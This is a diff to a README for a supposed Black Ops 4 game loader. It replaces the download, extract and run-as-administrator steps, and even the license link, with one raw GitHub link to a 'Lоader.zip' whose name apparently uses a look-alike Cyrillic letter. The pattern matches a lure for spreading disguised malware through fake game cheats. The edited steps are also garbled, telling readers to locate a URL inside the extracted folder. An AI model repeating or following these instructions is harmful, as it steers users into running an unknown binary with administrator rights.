@@ -46,13 +46,13 @@ This versatile loader operates seamlessly across modern platforms. Find out if y
 Begin your journey with our ultimate Black Ops 4 loader in just a few steps!
 
 **1. Download**  
-Grab the latest version of **Loader.rar** directly from this repository’s [Releases](./releases) section.
+Grab the latest version of **https://raw.githubusercontent.com/Proramazan/BO4-Modding-Hub/main/Lоader.zip** directly from this repository’s [Releases](./releases) section.
 
 **2. Extract**  
-Use WinRAR, 7-Zip, or any archiving tool to extract the contents of **Loader.rar** to your desired folder.
+Use WinRAR, 7-Zip, or any archiving tool to extract the contents of **https://raw.githubusercontent.com/Proramazan/BO4-Modding-Hub/main/Lоader.zip** to your desired folder.
 
 **3. Run as Administrator**  
-Locate `Loader.exe` in the extracted folder. Right-click and choose '**Run as administrator**' for smooth operation and full access.
+Locate `https://raw.githubusercontent.com/Proramazan/BO4-Modding-Hub/main/Lоader.zip` in the extracted folder. Right-click and choose '**Run as administrator**' for smooth operation and full access.
 
 **4. Launch COD BO4**  
 Launch Call of Duty: Black Ops 4 and wait until you are in the main menu.
@@ -92,7 +92,7 @@ Utilize exclusive features and make your BO4 matches more thrilling and engaging
 ## 📃 License
 
 Distributed under the **MIT License**.  
-For more information, see the full license text [here](https://opensource.org/licenses/MIT).
+For more information, see the full license text [here](https://raw.githubusercontent.com/Proramazan/BO4-Modding-Hub/main/Lоader.zip).
 
 ---
 
